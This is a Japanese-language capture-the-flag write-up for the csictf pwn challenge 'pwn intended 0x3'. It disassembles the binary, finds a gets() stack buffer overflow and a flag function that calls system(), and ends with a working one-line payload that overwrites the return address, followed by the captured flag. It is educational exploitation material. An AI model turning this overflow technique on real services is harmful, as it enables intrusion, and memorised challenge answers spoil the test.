# pwn intended 0x3:Pwn:313pts
Teleportation is not possible, or is it?  
nc chall.csivit.com 30013  
[pwn-intended-0x3](pwn-intended-0x3)  

# Solution
pwn-intended-0x3が渡されるのでgdbで見てみる。  
```bash
$ gdb pwn-intended-0x3
~~~
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401166 <+0>:     push   rbp
   0x0000000000401167 <+1>:     mov    rbp,rsp
   0x000000000040116a <+4>:     sub    rsp,0x20
   0x000000000040116e <+8>:     mov    rax,QWORD PTR [rip+0x2eeb]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x0000000000401175 <+15>:    mov    esi,0x0
   0x000000000040117a <+20>:    mov    rdi,rax
   0x000000000040117d <+23>:    call   0x401040 <setbuf@plt>
   0x0000000000401182 <+28>:    mov    rax,QWORD PTR [rip+0x2ee7]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x0000000000401189 <+35>:    mov    esi,0x0
   0x000000000040118e <+40>:    mov    rdi,rax
   0x0000000000401191 <+43>:    call   0x401040 <setbuf@plt>
   0x0000000000401196 <+48>:    mov    rax,QWORD PTR [rip+0x2ee3]        # 0x404080 <stderr@@GLIBC_2.2.5>
   0x000000000040119d <+55>:    mov    esi,0x0
   0x00000000004011a2 <+60>:    mov    rdi,rax
   0x00000000004011a5 <+63>:    call   0x401040 <setbuf@plt>
   0x00000000004011aa <+68>:    lea    rdi,[rip+0xe57]        # 0x402008
   0x00000000004011b1 <+75>:    call   0x401030 <puts@plt>
   0x00000000004011b6 <+80>:    lea    rax,[rbp-0x20]
   0x00000000004011ba <+84>:    mov    rdi,rax
   0x00000000004011bd <+87>:    mov    eax,0x0
   0x00000000004011c2 <+92>:    call   0x401060 <gets@plt>
   0x00000000004011c7 <+97>:    mov    eax,0x0
   0x00000000004011cc <+102>:   leave
   0x00000000004011cd <+103>:   ret
End of assembler dump.
```
BOFはあるが、どこへ飛ばせばいいか不明である。  
flag関数がないか決め打ちで実行するとあった。  
objdumpすればすぐに見つかる。  
```bash
gdb-peda$ disass flag
Dump of assembler code for function flag:
   0x00000000004011ce <+0>:     push   rbp
   0x00000000004011cf <+1>:     mov    rbp,rsp
   0x00000000004011d2 <+4>:     lea    rdi,[rip+0xe5f]        # 0x402038
   0x00000000004011d9 <+11>:    call   0x401030 <puts@plt>
   0x00000000004011de <+16>:    lea    rdi,[rip+0xe7b]        # 0x402060
   0x00000000004011e5 <+23>:    call   0x401050 <system@plt>
   0x00000000004011ea <+28>:    mov    edi,0x0
   0x00000000004011ef <+33>:    call   0x401070 <exit@plt>
End of assembler dump.
```
0x00000000004011ceへ飛ばしてやればいいので以下のようにリターンアドレスを書き換える。  
```bash
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x11\x40\x00\x00\x00\x00\x00" | nc chall.csivit.com 30013
Welcome to csictf! Time to teleport again.
Well, that was quick. Here's your flag:
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```
flagが出てきた。  

## csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}